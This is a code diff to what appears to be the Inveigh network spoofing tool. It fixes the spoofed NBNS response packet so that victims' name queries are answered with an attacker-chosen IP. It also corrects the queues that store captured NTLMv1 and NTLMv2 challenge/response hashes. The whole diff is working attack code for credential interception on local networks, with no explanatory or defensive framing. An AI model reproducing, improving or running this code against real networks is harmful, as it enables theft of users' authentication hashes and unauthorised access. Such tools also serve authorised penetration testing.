@@ -52,8 +52,11 @@ namespace Inveigh
 
                         case "-?":
                         case "/?":
-                            spooferIP = args[entry.index + 1];
-                            Console.WriteLine(IP);
+                            Console.WriteLine("Parameters:");
+                            Console.WriteLine("-IP              Primary IP address");
+                            Console.WriteLine("-NBNSTypes       Array of NBNS types to spoof");
+                            Console.WriteLine("-SpooferIP       IP address used in spoofed responses");
+                            Environment.Exit(0);
                             break;
 
                     }
@@ -148,7 +151,7 @@ namespace Inveigh
 
                     case "GET NTLMV2":
                         Console.Clear();
-                        string[] outputNTLMV2 = ntlmv1Queue.ToArray();
+                        string[] outputNTLMV2 = ntlmv2Queue.ToArray();
                         foreach (string entry in outputNTLMV2)
                             Console.WriteLine(entry);
                         break;
@@ -328,7 +331,7 @@ namespace Inveigh
                                         byte[] nbnsRequestType = new byte[2];
                                         System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                                         string nbnsQueryType = NBNSQueryType(nbnsRequestType);
-                                        byte[] nbnsRequest = new byte[udpPayload.Length - 19];
+                                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                                         System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                                         string nbnsQueryHost = BytesToNBNSQuery(nbnsRequest);
                                         string nbnsResponseMessage = "response sent";
@@ -344,6 +347,8 @@ namespace Inveigh
                                                 ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
                                                 ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
                                                 ms.Write(nbnsRequest, 0, nbnsRequest.Length);
+                                                ms.Write(nbnsRequestType, 0, 2);
+                                                ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
                                                 ms.Write(nbnsTTL, 0, 4);
                                                 ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
                                                 ms.Write(spooferIPData, 0, spooferIPData.Length);
@@ -664,6 +669,7 @@ namespace Inveigh
                 {
                     string ntlmV1Hash = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;
                     outputQueue.Enqueue(String.Format("[+] {0} SMB NTLMv1 challenge/response captured from {1}({2}):{3}{4}", DateTime.Now.ToString("s"), sourceIP, host, System.Environment.NewLine, ntlmV1Hash));
+                    ntlmv1Queue.Enqueue(ntlmV1Hash);
                 }
 
             }
